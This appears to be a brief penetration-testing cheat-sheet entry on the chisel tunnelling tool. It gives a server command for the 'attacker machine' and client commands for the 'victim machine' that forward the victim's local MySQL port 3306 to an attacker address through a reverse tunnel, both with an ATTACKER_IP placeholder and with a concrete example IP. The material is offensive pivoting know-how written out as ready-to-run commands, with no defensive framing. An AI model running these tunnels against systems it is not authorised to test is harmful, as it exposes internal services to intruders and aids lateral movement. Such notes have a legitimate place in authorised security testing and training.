https://github.com/jpillora/chisel/releases
# Attacker machine
```bash
chisel server -p 8001 --reverse
```
# Victim machine
```batch
.\chisel.exe client $(ATTACKER_IP):8001 R:$(LPORT):127.0.0.1:$(RPORT)
```
i.e. to tunnel a local port of 3306 on the victim machine to the attacker:
```batch
.\chisel.exe client 192.168.45.174:8001 R:3306:127.0.0.1:3306
```
Now the attacker machine can interact with 127.0.0.1:3306 for it to tunnel to the victim.
